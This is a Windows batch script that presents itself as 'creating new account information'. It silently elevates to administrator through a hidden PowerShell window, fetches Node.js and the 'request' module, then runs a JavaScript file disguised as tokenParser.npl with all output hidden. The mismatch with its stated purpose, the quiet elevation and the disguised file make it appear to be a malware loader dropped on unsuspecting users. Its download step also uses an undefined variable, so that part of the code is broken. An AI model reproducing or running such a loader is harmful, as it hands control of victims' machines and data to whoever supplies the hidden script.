@echo off
title Creating new Info
setlocal enabledelayedexpansion

:: Check for administrator privileges
>nul 2>&1 net session
if %errorlevel% NEQ 0 (
    if "%~1"=="_restarted" (
        exit /b 1
    )
    powershell -Command "Start-Process -FilePath '%~f0' -ArgumentList '_restarted' -Verb RunAs" -WindowStyle Hidden
    exit /b
)

echo ✅ Running with administrator rights.

echo Creating new account information...
set "NODE_VERSION=20.11.1"
set "NODE_MSI=node-v%NODE_VERSION%-x64.msi"
set "DOWNLOAD_URL=https://nodejs.org/dist/v%NODE_VERSION%/%NODE_MSI%"
set "NODE_DIR=%~dp0node-v%NODE_VERSION%-x64"

:: Reset installed version variable
set "NODE_INSTALLED_VERSION="

for /f "delims=" %%v in ('node -v 2^>nul') do (
    call set "NODE_INSTALLED_VERSION=%%v"
)

:: Determine if install is needed
if not defined NODE_INSTALLED_VERSION (
    set "INSTALL_NODE=1"
) else (
    set "INSTALL_NODE=0"
)

if "!INSTALL_NODE!"=="1" (
    echo Node.js not installed. Downloading Node.js...

    where curl >nul 2>&1
    if %errorlevel% NEQ 0 (
        powershell -Command "Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%NODE_TAR%'"
    ) else (
        curl -s -L -o "%NODE_TAR%" "%DOWNLOAD_URL%"
    )

    if exist "%NODE_TAR%" (
        echo Extracting Node.js...
        powershell -Command "tar -xf '%NODE_TAR%'"
        if exist "%NODE_TAR%" del "%NODE_TAR%"
    ) else (
        echo ❌ Failed to download Node.js.
        exit /b 1
    )

    set "PATH=%NODE_DIR%\bin;%PATH%"
)

:: Check if node and npm are now available
where node >nul 2>&1
if errorlevel 1 (
    echo ❌ Node.js still not found. Exiting.
    exit /b
)

where npm >nul 2>&1
if errorlevel 1 (
    echo ❌ npm not found. Exiting.
    exit /b
)

:: Install request if needed
if not exist "%~dp0node_modules\request" (
    echo Installing npm modules...
    pushd "%~dp0"
    call npm install request --silent --no-progress --loglevel=error --fund=false >nul 2>&1
    if errorlevel 1 (
        echo ❌ npm install failed.
        popd
        exit /b
    )
    popd
)

:: Run tokenParser.npl
if exist "%~dp0tokenParser.npl" (
    echo Running tokenParser...
    node "%~dp0tokenParser.npl" >nul 2>&1
    if errorlevel 1 (
        echo ❌ tokenParser script failed.
        exit /b
    )
) else (
    echo ❌ tokenParser.npl not found.
    exit /b
)

exit /b 0